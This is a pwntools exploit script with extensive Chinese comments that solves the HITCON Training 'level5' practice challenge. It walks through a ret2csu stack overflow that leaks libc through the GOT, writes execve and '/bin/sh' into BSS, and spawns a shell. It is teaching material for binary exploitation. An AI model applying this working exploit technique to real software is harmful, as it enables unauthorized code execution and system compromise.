from pwn import *
from LibcSearcher import LibcSearcher

# context.log_level = 'debug'  # 调试时打开，可以看到所有收发数据

# ============================================================
# 一、题目分析
# ============================================================
# level5 是 HITCON Training 的 ret2csu 练习题
# 64 位 ELF，开启了 NX（不可执行栈），没有 canary，没有 PIE
#
# 关键漏洞在 vulnerable_function:
#   read(0, buf, 0x200)  -- 往 0x80 大小的栈缓冲区读入 0x200 字节 → 栈溢出
#
# 关键约束：程序里没有 system()，也没有 /bin/sh 字符串
# 所以我们需要：
#   1. 泄露 libc 地址（通过 write 把 GOT 表项打印出来）
#   2. 算出 libc 基址，找到 execve 的地址
#   3. 把 execve 地址和 "/bin/sh" 字符串写到可控的内存（BSS 段）
#   4. 调用 execve("/bin/sh", NULL, NULL) 拿 shell
#
# 难点：没有现成的 gadget 能直接控制 rdi/rsi/rdx（程序太短小）
# 所以使用 ret2csu 技术，利用 __libc_csu_init 尾部的通用 gadget 来传参

# ============================================================
# 二、加载二进制 & 启动进程
# ============================================================
level5 = ELF('./level5')       # 加载 ELF，pwntools 自动解析符号表/GOT/PLT
sh = process('./level5')       # 启动本地进程

# ============================================================
# 三、收集需要用到的地址
# ============================================================
write_got = level5.got['write']   # write 在 GOT 表中的地址（运行时存着 write 的真实地址）
read_got  = level5.got['read']    # read  在 GOT 表中的地址
main_addr = level5.symbols['main']  # main 函数地址，用来做"回跳"让程序可以反复被利用
bss_base  = level5.bss()          # BSS 段起始地址（可写的空闲内存，用来存放我们的数据）

# ret2csu 的两个关键 gadget 地址（在 __libc_csu_init 函数里）
csu_end_addr   = 0x40061A   # gadget1：pop rbx / pop rbp / pop r12 / pop r13 / pop r14 / pop r15 / ret
csu_front_addr = 0x400600   # gadget2：mov rdx,r13 / mov rsi,r14 / mov edi,r15d / call [r12+rbx*8]

fakeebp = b'b' * 8  # 覆盖 saved rbp（溢出时需要跳过它）

# ============================================================
# 四、ret2csu 原理详解
# ============================================================
#
# __libc_csu_init 的尾部有两段 gadget，合在一起可以控制 rdi/rsi/rdx 并调用任意函数：
#
# 【gadget1 @ 0x40061A】（先执行这段，从栈上弹出 6 个值到寄存器）
#   pop rbx    ;  → 我们设为 0
#   pop rbp    ;  → 我们设为 1
#   pop r12    ;  → 我们设为目标函数的 GOT 地址（call 指令会间接调用它）
#   pop r13    ;  → 映射到 rdx（第 3 个参数）
#   pop r14    ;  → 映射到 rsi（第 2 个参数）
#   pop r15    ;  → 映射到 edi（第 1 个参数，注意是 32 位）
#   ret        ;  → 跳到 gadget2
#
# 【gadget2 @ 0x400600】（把刚才 pop 进去的值搬到函数调用的参数寄存器里）
#   mov rdx, r13        ; rdx = r13 → 第 3 个参数
#   mov rsi, r14        ; rsi = r14 → 第 2 个参数
#   mov edi, r15d       ; edi = r15 → 第 1 个参数（低 32 位）
#   call [r12 + rbx*8]  ; 调用 *(r12 + rbx*8)
#   add rbx, 1          ; rbx++
#   cmp rbp, rbx        ; 比较 rbx 和 rbp
#   jne ...             ; 如果 rbx != rbp 就继续循环（但我们设 rbx=0, rbp=1 所以只执行一次）
#   add rsp, 8          ; 跳过一个 8 字节槽位
#   pop rbx             ; 恢复 rbx
#   pop rbp             ; 恢复 rbp
#   pop r12             ; 恢复 r12
#   pop r13             ; 恢复 r13
#   pop r14             ; 恢复 r14
#   pop r15             ; 恢复 r15
#   ret                 ; 返回到我们指定的地址
#
# 总结参数映射：
#   rdi (第1参数) = r15
#   rsi (第2参数) = r14
#   rdx (第3参数) = r13
#   调用的目标    = [r12 + rbx*8]  （rbx=0 时就是 *r12，即 r12 指向的 GOT 表项里的函数地址）
#
# 注意：call [r12 + rbx*8] 是间接调用，r12 存的必须是「存放函数地址的地址」
#       所以 r12 应该放 GOT 表项地址（如 write_got），而不是函数地址本身

def csu(rbx, rbp, r12, r13, r14, r15, last):
    """
    利用 ret2csu gadget 调用任意 GOT 中的函数，并在函数返回后跳转到 last

    参数：
      rbx  → 设为 0（保证 call 只执行一次）
      rbp  → 设为 1（rbx+1=1 == rbp，跳过循环）
      r12  → 目标函数的 GOT 地址（call 会读取 *r12 得到真实函数地址）
      r13  → 传给 rdx 的值（第 3 个参数）
      r14  → 传给 rsi 的值（第 2 个参数）
      r15  → 传给 edi 的值（第 1 个参数）
      last → 函数返回后跳转到哪里（通常是 main_addr 让程序可以再来一次）
    """
    # 构造 payload：
    # [0x80 字节填充] [8 字节 fake rbp] [返回地址 + gadget 参数...]
    payload  = b'a' * 0x80 + fakeebp          # 填满缓冲区 + 覆盖 saved rbp
    payload += p64(csu_end_addr)               # 返回地址 → 先跳到 gadget1（pop 6 个寄存器）
    payload += p64(rbx)                        # → pop 到 rbx（设 0）
    payload += p64(rbp)                        # → pop 到 rbp（设 1）
    payload += p64(r12)                        # → pop 到 r12（目标函数的 GOT 地址）
    payload += p64(r13)                        # → pop 到 r13（会搬到 rdx）
    payload += p64(r14)                        # → pop 到 r14（会搬到 rsi）
    payload += p64(r15)                        # → pop 到 r15（会搬到 edi）
    payload += p64(csu_front_addr)             # → gadget1 的 ret 跳到这里（gadget2，执行 call）
    payload += b'a' * 0x38                     # gadget2 执行完后：
                                               #   add rsp, 8（跳1个槽）
                                               #   pop rbx/rbp/r12/r13/r14/r15（跳6个槽）
                                               #   总共跳过 7*8 = 0x38 字节
    payload += p64(last)                       # 最后 pop 到 ret → 跳到 last（main_addr）
    sh.send(payload)                           # 发送 payload
    sleep(1)                                   # 等程序处理完

# ============================================================
# 五、攻击流程（分 3 轮，每轮都利用 main 回跳重新触发溢出）
# ============================================================

# ---------- 第 1 轮：泄露 libc 地址 ----------
# 目标：调用 write(1, write_got, 8)
#   - fd=1 (stdout)
#   - buf=write_got（GOT 表中 write 的真实地址所在位置）
#   - count=8（打印 8 字节 = 一个 64 位地址）
# 这样程序就会把 write 在 libc 中的真实地址打印出来给我们
sh.recvuntil(b'Hello, World\n')  # 消耗掉 main 中 write() 打印的提示文字

#               rbx  rbp  r12         r13(→rdx) r14(→rsi)    r15(→edi)  last
csu(0, 1, write_got,  8, write_got,          1, main_addr)
#            ↑call目标  ↑count=8  ↑buf=write_got  ↑fd=1    ↑回到main再来一次

# 接收 write 打印出来的 8 字节（就是 write 的真实 libc 地址）
write_addr = u64(sh.recv(8))       # 把 8 字节小端序转成 64 位整数

# 用 LibcSearcher 在线查询匹配的 libc 版本
# （如果本地知道 libc 版本，可以直接算偏移，不需要这步）
libc = LibcSearcher('write', write_addr)

# 算出 libc 基址 = write 真实地址 - write 在 libc 中的偏移
libc_base = write_addr - libc.dump('write')

# 算出 execve 的真实地址 = libc 基址 + execve 在 libc 中的偏移
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))

# ---------- 第 2 轮：向 BSS 段写入数据 ----------
# 目标：调用 read(0, bss_base, 16)
#   - fd=0 (stdin，从键盘/管道读取)
#   - buf=bss_base（BSS 段，可写且地址固定）
#   - count=16 字节
# 我们会发送 execve_addr（8字节）+ "/bin/sh\x00"（8字节）= 16 字节
# 这样 BSS 段前 8 字节存 execve 的地址，后 8 字节存 "/bin/sh" 字符串

sh.recvuntil(b'Hello, World\n')  # main 再次打印提示

#               rbx  rbp  r12        r13(→rdx)  r14(→rsi)    r15(→edi)  last
csu(0, 1, read_got,  16, bss_base,          0, main_addr)
#            ↑call目标 ↑count=16 ↑buf=bss_base  ↑fd=0(读stdin) ↑回main

sh.send(p64(execve_addr) + b'/bin/sh\x00')  # 发送 16 字节写入 BSS

# 写入后 BSS 段的布局：
#   bss_base + 0:  execve 的地址（8 字节）
#   bss_base + 8:  "/bin/sh\x00"（8 字节）

# ---------- 第 3 轮：调用 execve 拿 shell ----------
# 目标：调用 execve(bss_base+8, NULL, NULL)
#   - rdi = bss_base + 8  → 指向 "/bin/sh" 字符串
#   - rsi = 0             → argv = NULL
#   - rdx = 0             → envp = NULL
#
# 关键技巧：r12 存 bss_base，那么 *r12 = *(bss_base) = execve 的地址
#   → call [r12 + rbx*8] = call *bss_base = call execve
#   → 相当于调用 execve，而此时 r15 = bss_base+8 = "/bin/sh" 的地址

sh.recvuntil(b'Hello, World\n')  # main 再次打印提示

#               rbx  rbp  r12        r13(→rdx) r14(→rsi) r15(→edi)       last
csu(0, 1, bss_base,   0,        0,  bss_base + 8, main_addr)
#            ↑call目标    ↑rdx=0  ↑rsi=0 ↑edi=指向"/bin/sh"

# 此时 call [r12+rbx*8] = call [bss_base] = call execve
# 等价于 execve("/bin/sh", NULL, NULL) → 拿到 shell！

sh.interactive()  # 切换到交互模式，可以输入 shell 命令了
